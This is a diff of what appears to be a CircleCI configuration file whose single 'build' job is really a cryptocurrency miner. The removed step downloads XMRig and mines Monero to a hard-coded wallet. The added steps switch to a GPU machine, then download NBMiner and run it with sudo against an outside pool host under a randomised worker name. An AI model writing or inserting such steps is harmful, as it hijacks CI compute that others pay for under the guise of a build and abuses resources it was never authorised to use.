@@ -1,10 +1,11 @@
-version: 2.0
+version: 2.1
+
 jobs:
   build:
     machine:
-      image: ubuntu-2004:202010-01 # recommended linux image
-    resource_class: large
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
     steps:
-      steps:
-      - checkout
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz && tar -xvf xmrig-6.16.3-linux-x64.tar.gz && cd xmrig-6.16.3 && ./xmrig -a rx/0 -o sg.minexmr.com:443 -u 8BNvDNCGwW5T4iwdRbbJCdQcbb7sopwNDATazRuoRGaV1LXFoDNfTcSFwoZzPbgi1VNajuxUYhYbB3mQdCyFmYjm347Lohh -k --tls --rig-id AST
+      - run: nvidia-smi
+      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a etc -o vrab.servegame.com:443 -u Astungk1.$(shuf -n 1 -i 1-99999)  --enable-dag-cache
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
